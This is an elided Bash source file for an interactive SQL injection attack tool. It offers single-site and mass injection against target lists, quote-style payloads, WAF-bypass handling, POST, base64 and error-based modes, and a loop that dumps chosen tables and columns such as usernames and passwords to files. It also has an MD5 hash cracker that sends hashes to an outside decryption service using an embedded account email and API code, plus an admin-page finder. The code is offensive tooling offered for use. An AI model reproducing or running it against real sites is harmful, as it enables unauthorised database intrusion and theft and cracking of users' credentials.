...
edump () {
  ...
  do
   ...
   do
     ...
     read table2
     [[ -z "$table2" ]] && { echo -e "${N}[*] Returning to menu...${N}"; return; }
     if [[ "$corect" = "y" ]];then
     ...
     then
        ...
        do
          ...
          read co
          [[ -z "$co" ]] && { echo -e "${N}[*] Returning to menu...${N}"; return; }
          if [ ${#co} -gt 1 ]
          then
              cor=$(echo $co | sed 's/,/|/g')
                 ...
                 then
                    ...
                    *) echo -e "\n${O}skip to next site${N}";;
                    ...
                    break 4
                     ...
                     echo -e "${R}wrong input — column not found in table${N}"
                     echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                     cat .table
                     return
                  fi
              else
                  echo -e "${R}wrong input — table not found${N}"
                  echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                  cat .table
                  return
              fi
          else
              echo -e "${R}wrong input — column name too short${N}"
              echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
              cat .table
              return
          fi
          ...
          echo -e "${R}wrong input — table name too short${N}"
          echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
          cat .table
          return
       fi
    ...
    if echo -e "$ngecur" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null
      then
       ...
       then
          ...
          echo -e "\x1b[0m${N}[${R}`date +%T`${N}] ${R}Failed ${O}try bypass waff manual"
      fi
      break
    fi
...
# ─────────────────────────────────────────────────────────────
#  PLAIN INJECT RUNNER  (calls plain_inject.py, no WAF bypass)
# ─────────────────────────────────────────────────────────────
run_plain_inject() {
  local target_url="$1"
  local mode="$2"          # "noquote" or "singlequote"
  local inject_url

  if [[ "$mode" = "singlequote" ]]; then
    inject_url="${target_url}%27"
  else
    inject_url="$target_url"
  fi

  SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
  PLAIN_SCRIPT="${SCRIPT_DIR}/plain_inject.py"

  if [[ ! -f "$PLAIN_SCRIPT" ]]; then
    echo -e "${R}[!] plain_inject.py not found: $PLAIN_SCRIPT${N}"
    return 1
  fi

  local dir
  dir=$(echo "$target_url" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  mkdir -p "output/$dir"

  echo -e "\n${G}[+] PLAIN injection — no WAF bypass${N}"
  echo -e "${O}[*] Mode   : ${N}\033[2m$mode${N}"
  echo -e "${O}[*] Target : ${N}\033[2m$inject_url${N}\n"

  local tmpout
  tmpout=$(mktemp /tmp/.plain_out.XXXXXX)

  # ── run enumeration (background → Ctrl+C kills it cleanly) ─
  local py_pid
  python3 -u "$PLAIN_SCRIPT" "$inject_url" 0 enum_only >"$tmpout" &
  py_pid=$!
  trap 'kill "$py_pid" 2>/dev/null; wait "$py_pid" 2>/dev/null
        rm -f "$tmpout"
        echo -e "\n${R}[!] Interrupted by user${N}"; trap - INT; return 1' INT
  wait "$py_pid"
  local py_exit=$?
  trap - INT

  # ── check for errors ─────────────────────────────────────
  if [[ $py_exit -ne 0 ]] && ! grep -q "^DATABASE=" "$tmpout"; then
    echo -e "${R}[!] plain_inject.py exited with code $py_exit${N}"
    rm -f "$tmpout"
    return 1
  fi
  if grep -q "^ERROR=" "$tmpout"; then
    local err
    err=$(grep "^ERROR=" "$tmpout" | head -1 | cut -d= -f2-)
    echo -e "\n${R}[!] $err${N}"
    rm -f "$tmpout"
    return 1
  fi
  ...
  local db_name db_ver db_user refl
  db_name=$(grep "^DATABASE=" "$tmpout" | head -1 | cut -d= -f2-)
  db_ver=$(grep  "^VERSION="  "$tmpout" | head -1 | cut -d= -f2-)
  db_user=$(grep "^USER="     "$tmpout" | head -1 | cut -d= -f2-)
  refl=$(grep    "^REFLECTED=" "$tmpout" | head -1 | cut -d= -f2-)

  echo -e "\n${O}+$(printf '%0.s─' {1..54})+${N}"
  echo -e "  ${G}Database${N} : ${O}$db_name${N}"
  echo -e "  ${G}Version ${N} : ${O}$db_ver${N}"
  echo -e "  ${G}User    ${N} : ${O}$db_user${N}"
  echo -e "  ${G}Refl.col${N} : ${O}$refl${N}"
  echo -e "${O}+$(printf '%0.s─' {1..54})+${N}"

  # ── tables ────────────────────────────────────────────────
  echo -e "\n${G}[+] Tables found:${N}"
  grep "^TABLE=" "$tmpout" | cut -d= -f2- | while read -r t; do
    echo -e "  ${O}~${N} $t"
  done

  # ── columns ───────────────────────────────────────────────
  echo -e "\n${G}[+] Columns found:${N}"
  grep "^COLUMN=" "$tmpout" | cut -d= -f2- | while read -r c; do
    echo -e "  ${O}~${N} $c"
  done

  # ── save enumeration results ──────────────────────────────
  {
    echo "=== PLAIN INJECT RESULTS ==="
    echo "Target   : $inject_url"
    echo "Database : $db_name"
    echo "Version  : $db_ver"
    echo "User     : $db_user"
    grep "^TABLE="  "$tmpout"
    grep "^COLUMN=" "$tmpout"
  } > "output/$dir/plain_results.txt"
echo -e "${G}[+] Enumeration saved${N}: output/$dir/plain_results.txt"

  # ── interactive dump loop ─────────────────────────────────
  while true; do
    echo -e "\n${O}+$(printf '%0.s─' {1..54})+${N}"
    echo -e "  ${G}Available tables:${N}"
    grep "^TABLE=" "$tmpout" | cut -d= -f2- | nl -ba | while read -r line; do
      echo -e "    ${O}$line${N}"
    done
    echo -e "${O}+$(printf '%0.s─' {1..54})+${N}"
    echo -en "\n${G}[?]${N} Dump table name (Enter to skip): ${O}"
    read -r dump_tbl
    [[ -z "$dump_tbl" ]] && break

    echo -e "\n${G}[+] Columns in ${O}$dump_tbl${G}:${N}"
    grep "^COLUMN=${dump_tbl}::" "$tmpout" | sed "s/COLUMN=${dump_tbl}::/  ${O}~${N} /" | while read -r line; do
      echo -e "$line"
    done

    echo -en "${G}[?]${N} Columns to dump (comma-sep, e.g. id,username,password): ${O}"
    read -r dump_cols
    if [[ -z "$dump_cols" ]]; then
      echo -e "${R}[!] No columns specified, skipping.${N}"
      continue
    fi

    echo -e "\n${G}[*] Dumping ${O}$dump_cols${G} from ${O}$dump_tbl${G}...${N}"
    local tmp_dump
    tmp_dump=$(mktemp /tmp/.plain_dump.XXXXXX)

    local py_pid2
    python3 -u "$PLAIN_SCRIPT" "$inject_url" 0 dump "$dump_tbl" "$dump_cols" >"$tmp_dump" &
    py_pid2=$!
    trap 'kill "$py_pid2" 2>/dev/null; wait "$py_pid2" 2>/dev/null
          rm -f "$tmp_dump"; echo -e "\n${R}[!] Interrupted${N}"; trap - INT; break' INT
    wait "$py_pid2"
    trap - INT
    ...
    while IFS= read -r line; do
      if [[ "$line" == DUMP=* ]]; then
        local row="${line#DUMP=}"
        echo -e "  ${G}>>  ${N}${row//::/  ${O}::${N}  }"
        echo "$row" >> "output/$dir/dump-${dump_tbl}.txt"
        ((row_count++))
      fi
    done < "$tmp_dump"
    echo -e "${O}+$(printf '%0.s─' {1..54})+${N}"
    echo -e "${G}[+] Total dumped : ${O}$row_count rows${N}"
    echo -e "${G}[+] Saved        : ${N}output/$dir/dump-${dump_tbl}.txt"

    rm -f "$tmp_dump"
  done

  rm -f "$tmpout"
  echo -e "\n${G}[+] Plain inject finished. Output: output/$dir/${N}"
}

# ── helper: inject every parameter variation of a multi-param URL ──
_do_multi_param_sqli() {
  rm -rf .var .var2
  local asq eq iq var1
  asq=$(echo "$site" | grep -ao ".[^&]*" | head -1)
  eq=$(echo "$site"  | grep -ao ".[^&]*" | wc -l)
  echo "$asq" >> .var
  ...
  trap break INT
  while IFS= read -r site; do sqli; done < .var
  trap - INT
}

_do_multi_param_plain() {
  local mode="$1"
  rm -rf .var .var2
  local asq eq iq var1
  asq=$(echo "$site" | grep -ao ".[^&]*" | head -1)
  ...
  while IFS= read -r site_var; do
    run_plain_inject "$site_var" "$mode"
  done < .var
}

# ─────────────────────────────────────────────────────────────
#  MAIN MENU  –  v2  (9 options)
# ─────────────────────────────────────────────────────────────
menu() {
  angkab=$(awk 'BEGIN{srand();for(i=1;i<=1000;i++)print int(1+rand()*5)}' | head -1)
  angkam=$(awk 'BEGIN{srand();for(i=1;i<=1000;i++)print int(1+rand()*2)}' | head -1)
  clear
  banner${angkab}
  msg${angkam}
...
[${O}9${N}]. auto bypass sql login tools
\033[2mpress Enter for exit${N}"
  ...
  1)
    mass="n"; dump_name="n"; waff="n"
    clear; banner${angkab}
    echo -e "                |\033[7;32m SINGGLE SITE XPLOITER ${N}|\n"
    echo -en "[${O}?${N}] site: ${O}"; read -r site; echo -en "${N}\n"

    # ── detect double parameters ────────────────────────────
    if echo "$site" | grep -qP "&"; then
      echo -e "${N}\x1b[0m${N}[${O}\033[2m$(date +%T)${N}] ${G}\033[2mdouble parameter found"
    fi

    # ── quote style sub-menu ────────────────────────────────
    echo -e "\n${N}[${G}?${N}] Select quote style for parameter injection:"
    echo -e "  [${O}1${N}] No quote (Integer based)"
    echo -e "  [${O}2${N}] Single quote (')"
    echo -e "  [${O}3${N}] Double quote (\")"
    echo -e "  [${O}4${N}] Auto identify"
    echo -e "  [${O}5${N}] No quote + PLAIN (force no WAF bypass)"
    echo -e "  [${O}6${N}] Single quote + PLAIN (force no WAF bypass)"
    echo -ne "[${R}?${N}] Choose [1-6] or auto: ${O}"; read -r qstyle; echo -en "${N}\n"

    case "$qstyle" in
      1)
        union=$(echo "$union" | sed "s/'//g;s/%27//g")
        if echo "$site" | grep -qP "&"; then _do_multi_param_sqli
        else sqli; fi
        ;;
      2)
        union="%27${union}"
      ...
      4|auto|"")
        ...
        ;;
      5)
        if echo "$site" | grep -qP "&"; then _do_multi_param_plain "noquote"
        else run_plain_inject "$site" "noquote"; fi
        ;;
      6)
        if echo "$site" | grep -qP "&"; then _do_multi_param_plain "singlequote"
        else run_plain_inject "$site" "singlequote"; fi
        ;;
      *)
        if echo "$site" | grep -qP "&"; then _do_multi_param_sqli
        else sqli; fi
  ...
  2)
    ...
    echo -en "[${O}?${N}] Enter target list file: ${O}"; read -r tar
    echo -e "${N}\033[2mLoad site from $tar — $(wc -l < "$tar" 2>/dev/null) urls\n"
    echo -e "${N}\033[2muse ctrl+c during order-by to skip to next site${N}"
    rm -rf .case1
    trap break INT
    while IFS= read -r site; do
      waff="n"; dump_name="n"; union="$union1"
      if echo "$site" | grep -qP "&"; then
        rm -rf .var .var2
        asq=$(echo "$site" | grep -ao ".[^&]*" | head -1)
        eq=$(echo "$site"  | grep -ao ".[^&]*" | wc -l)
    ...
    done < <(cat "$tar" 2>/dev/null | tr -d '\0' | sed 's/\r$//')
    trap - INT
    menu
    ;;

  # ── [3] SQLi Base64 injection ──────────────────────────────
  3)
    based64="y"; masn="n"; waff="n"
    clear; banner${angkab}
    echo -e "                |\033[7;32m BASE64 INJECTION ${N}|\n"
    echo -e "${G}\033[2mFor sites with base64-encoded parameters${N}"
    echo -en "${N}[${R}?${N}] site: ${O}"; read -r site
    sqli
    menu
    ;;
  ...
  # ── [4] SQLi POST method ───────────────────────────────────
  4)
    masn="n"; postd="y"; waff="n"
    clear; banner${angkab}
    echo -e "                |\033[7;32m SQLI POST METHOD ${N}|\n"
    echo -e "${G}\033[2mFor sites with POST parameters${N}"
    echo -en "${N}[${R}?${N}] site: ${O}";      read -r site
    echo -en "${N}[${O}+${N}] parameter name: ${G}"; read -r postnya
    sqli
    menu
    ;;

  # ── [5] SQLi ERROR Based method ───────────────────────────
  5)
    clear; banner${angkab}
    echo -e "                |\033[7;32m ERROR BASED INJECTION ${N}|\n"
    echo -e "[${G}1${N}]. single site"
    echo -e "[${G}2${N}]. mass inject"
    echo -e "[${G}3${N}]. return to main menu"
    echo -ne "[${R}?${N}] which one ?? "; read -r p
    case $p in
      1)
        masn="n"; waff="n"
        clear; banner${angkab}
        echo -e "                |\033[7;32m ERROR BASED INJECTION ${N}|\n"
        echo -en "site: "; read -r site; esql
        ;;
      2)
        masn="y"; waff="n"
        clear; banner${angkab}
        echo -e "                |\033[7;32m ERROR BASED INJECTION — mass ${N}|\n"
        echo -en "site list: "; read -r file
        echo -e "${N}\033[2mLoad: $(wc -l < "$file" 2>/dev/null) urls"
        trap break 2 INT
        while IFS= read -r site; do esql; done < <(cat "$file" 2>/dev/null | tr -d '\0' | sed 's/\r$//')
        trap - INT
        ;;
      *) ;;
    esac
  ...
  6)
    clear; banner${angkab}
    echo -e "                |\033[7;32m SCAN SITE + AUTO INJECT ${N}|\n"
    echo -e "[${G}1${N}]. single site"
    ...
    case $p in
      1)
        ...
        clear; banner${angkab}
        echo -e "                |\033[7;32m SCAN SITE + AUTO INJECT ${N}|\n"
        echo -en "site: "; read -r site; fuzy
        ;;
      2)
        masn="y"; waff="n"
        clear; banner${angkab}
        echo -e "                |\033[7;32m SCAN SITE + AUTO INJECT — mass ${N}|\n"
        echo -en "site list: "; read -r file
        while IFS= read -r site; do waff="n"; fuzy; done < <(cat "$file" 2>/dev/null)
        ;;
      *) ;;
    esac
    menu
  ...
  7)
    ...
    echo -e "[${G}2${N}]. md5 decryptor (single)"
    echo -e "[${G}3${N}]. md5 decryptor (mass)"
    echo -e "[${G}4${N}]. md5 email:pass cracker"
    echo -ne "[${R}?${N}] which one ?? "; read -r p
    case $p in
      1)
        clear; banner${angkab}
      ...
      2)
        ...
        echo -en "[+] Hash: "; read -r hash
        dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" \
          --max-time "$time_out" -sL \
          "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
        if [[ -z "$dec" ]]; then echo -e "${R}[!] Failed to crack${N}"
        else echo -e "${G}[+] Result: $dec${N}"; fi
        read -rp "Press Enter to continue " _
        ;;
      3)
        clear; banner${angkab}
        echo -e "                |\033[7;32m MD5 DECRYPTOR — mass ${N}|\n"
        echo -en "[+] Enter hash list file: "; read -r file
        while IFS= read -r hash; do
          dec=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" \
            --max-time "$time_out" -sL \
            "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728")
          if [[ -z "$dec" ]]; then echo -e "${R}[?] Not cracked: $hash${N}"
          else echo -e "${G}[!] Cracked: $hash : $dec${N}"; echo "$hash:$dec" >> cracked-mass.txt; fi
        done < <(cat "$file" 2>/dev/null)
        read -rp "Press Enter to continue " _
        ;;
      4)
        clear; banner${angkab}
        echo -e "                |\033[7;32m MD5 EMAIL:PASS CRACKER ${N}|\n"
        hashmail
        ;;
      *) ;;
    esac
  ...
  8)
    ...
    case $p in
      1)
        clear; banner${angkab}
        echo -e "                   |\033[7;32m ADMIN FINDER ${N}|\n"
        echo -en "site: "; read -r site
        adminfin
        ;;
      2)
        clear; banner${angkab}
        echo -e "                   |\033[7;32m ADMIN FINDER — mass ${N}|\n"
        echo -en "site list: "; read -r list
        while IFS= read -r site; do adminfin; done < <(cat "$list" 2>/dev/null | sed 's/\r$//' | tr -d '\0')
        ;;
      *) ;;
    esac
    menu
